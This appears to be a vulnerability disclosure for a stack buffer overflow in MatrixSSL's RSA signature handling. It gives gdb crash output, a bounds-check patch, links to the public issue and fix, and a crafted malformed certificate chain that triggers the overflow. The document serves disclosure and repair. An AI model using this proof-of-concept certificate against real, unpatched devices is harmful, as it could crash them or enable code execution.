@@ -1,0 +1,98 @@
+I happened to notice that a public X.509 certificate testcase for CVE-2014-1569 caused a stack buffer overflow in MatrixSSL.
+
+I cleaned up the testcase a bit, to make a better demonstration. You can test it with the certValidate tool that comes with MatrixSSL.
+
+$ gdb -q --args matrixssl/matrixssl/test/certValidate stackbufferoverflow.pem
+Reading symbols from matrixssl/matrixssl/test/certValidate...done.
+(gdb) r
+Starting program: matrixssl/matrixssl/test/certValidate stackbufferoverflow.pem
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+  Loaded chain file stackbufferoverflow.pem
+        [0]:berserk.filippo.io
+        [1]:(null)
+WARN subject not provided, SUBJ validation will be skipped
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00005555555c5164 in pubRsaDecryptSignedElementExt
+(gdb) bt
+#0  0x00005555555c5164 in pubRsaDecryptSignedElementExt
+#1  0x4141414141414141 in ?? ()
+#2  0x0000000000000000 in ?? ()
+
+I believe any client or server that validates certificates will be affected by this, and as MatrixSSL is usually used in embedded devices where mitigations are usually not quite as thorough as modern distributions, exploitation might not be difficult.
+
+The bug is that pubRsaDecryptSignedElementExt() uses a fixed size stack buffer, but then doesn't check if the key size exceeds it. The patch below should solve it.
+
+diff --git a/crypto/pubkey/rsa_pub.c b/crypto/pubkey/rsa_pub.c
+index f1d57e0..fa36e42 100644
+--- a/crypto/pubkey/rsa_pub.c
++++ b/crypto/pubkey/rsa_pub.c
+@@ -63,6 +63,12 @@ int32_t psRsaDecryptPubExt(psPool_t *pool,
+         return PS_ARG_FAIL;
+     }
+ 
++    if (*outlen < key->size)
++    {
++        psTraceCrypto("Error on bad outlen parameter to psRsaDecryptPub\n");
++        return PS_ARG_FAIL;
++    }
++
+     ptLen = inlen;
+ 
+     /* Raw, in-place RSA decryption. */
+
+
+I'm filing this issue just for tracking, as the testcase is already public I just went ahead and created a public issue:
+
+https://github.com/matrixssl/matrixssl/issues/26
+
+It looks like the maintainers are preparing to publish version 4.0.2 to correct this bug:
+
+https://github.com/matrixssl/matrixssl/commit/1fe26f3474706fc2dd4acd42a99167171dc34959
+
+
+-----BEGIN CERTIFICATE-----
+MIID+DCCAuCgAwIBAgIIAAAAAAAAAAAwDQYJKoZIhvcNAQEFBQAwYzELMAkGA1UEBhMCVVMxITAf
+BgNVBAoTGFRoZSBHbyBEYWRkeSBHcm91cCwgSW5jLjExMC8GA1UECxMoR28gRGFkZHkgQ2xhc3Mg
+MiBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0eTAeFw0xNjA1MDUxNDUwMzMAFw0xNzA1MDUxNDU1MzMA
+MHMxCzAJBgMAAAAAAgAAMRIwEAYDAAAAAAkAAAAAAAAAAAAxGzAZBgMAAAAAEgAAAAAAAAAAAAAA
+AAAAAAAAADEWMBQGAwAAAAANAAAAAAAAAAAAAAAAADEbMBkGA1UEAxMSYmVyc2Vyay5maWxpcHBv
+LmlvMIIAADANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6AAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAIDAAAAo4EAMIGcMAAGA1UdDwEBAAQAAwIAADAABgNVHSUEADAUBggAAAAAAAAAAAYI
+AAAAAAAAAAAwAAYDVR0TAQEABAAwADAABgNVHQ4EAAQUAAAAAAAAAAAAAAAAAAAAAAAAAAAwHwYD
+AAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwHQYDAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAMA0GCSqGSIb3DQEBBQUAA4IBAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoU9YAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAIRcuKDsOIw8AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+-----END CERTIFICATE-----
+-----BEGIN CERTIFICATE-----
+MIIEADCCAuigAwIBAgIBADANBgkqhkiG9w0BAQUFADBjMQswCQYDVQQGEwJVUzEh
+MB8GA1UEChMYVGhlIEdvIERhZGR5IEdyb3VwLCBJbmMuMTEwLwYDVQQLEyhHbyBE
+YWRkeSBDbGFzcyAyIENlcnRpZmljYXRpb24gQXV0aG9yaXR5MB4XDTA0MDYyOTE3
+MDYyMFoXDTM0MDYyOTE3MDYyMFowYzELMAkGA1UEBhMCVVMxITAfBgNVBAoTGFRo
+ZSBHbyBEYWRkeSBHcm91cCwgSW5jLjExMC8GA1UECxMoR28gRGFkZHkgQ2xhc3Mg
+MiBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0eTCCASAwDQYJKoZIhvcNAQEBBQADggEN
+ADCCAQgCggEBAN6d1+pXGEmhW+vXX0iG6r7d/+TvZxz0ZWizV3GgXne77ZtJ6XCA
+PVYYYwhv2vLM0D9/AlQiVBDYsoHUwHU9S3/Hd8M+eKsaA7Ugay9qK7HFiH7Eux6w
+wdhFJ2+qN1j3hybX2C32qRe3H3I2TqYXP2WYktsqbl2i/ojgC95/5Y0V4evLOtXi
+EqITLdiOr18SPaAIBQi2XKVlOARFmR6jYGB0xUGlcmIbYsUfb18aQr4CUWWoriMY
+avx4A6lNf4DD+qta/KFApMoZFv6yyO9ecw3ud72a9nmYvLEHZ6IVDd2gWMZEewo+
+YihfukEHU1jPEX44dMX4/7VpkI+EdOqXG68CAQOjgcAwgb0wHQYDVR0OBBYEFNLE
+sNKR1EwRcbNhyz2h/t2oatTjMIGNBgNVHSMEgYUwgYKAFNLEsNKR1EwRcbNhyz2h
+/t2oatTjoWekZTBjMQswCQYDVQQGEwJVUzEhMB8GA1UEChMYVGhlIEdvIERhZGR5
+IEdyb3VwLCBJbmMuMTEwLwYDVQQLEyhHbyBEYWRkeSBDbGFzcyAyIENlcnRpZmlj
+YXRpb24gQXV0aG9yaXR5ggEAMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQAD
+ggEBADJL87LKPpH8EsahB4yOd6AzBhRckB4Y9wimPQoZ+YeAEW5p5JYXMP80kWNy
+OO7MHAGjHZQopDH2esRU1/blMVgDoszOYtuURXO1v0XJJLXVggKtI3lpjbi2Tc7P
+TMozI+gciKqdi0FuFskg5YmezTvacPd+mSYgFFQlq25zheabIZ0KbIIOqPjCDPoQ
+HmyW74cNxA9hi63ugyuV+I6ShHI56yDqg+2DzZduCLzrTia2cyvk0/ZM/iZx4mER
+dEr/VxqHD3VILs9RaRegAhJhldXRQLIQTO7ErBBDpqWeCtWVYpoNz4iCxTIM5Cuf
+ReYNnyicsbkqWletNw+vHX/bvZ8=
+-----END CERTIFICATE-----
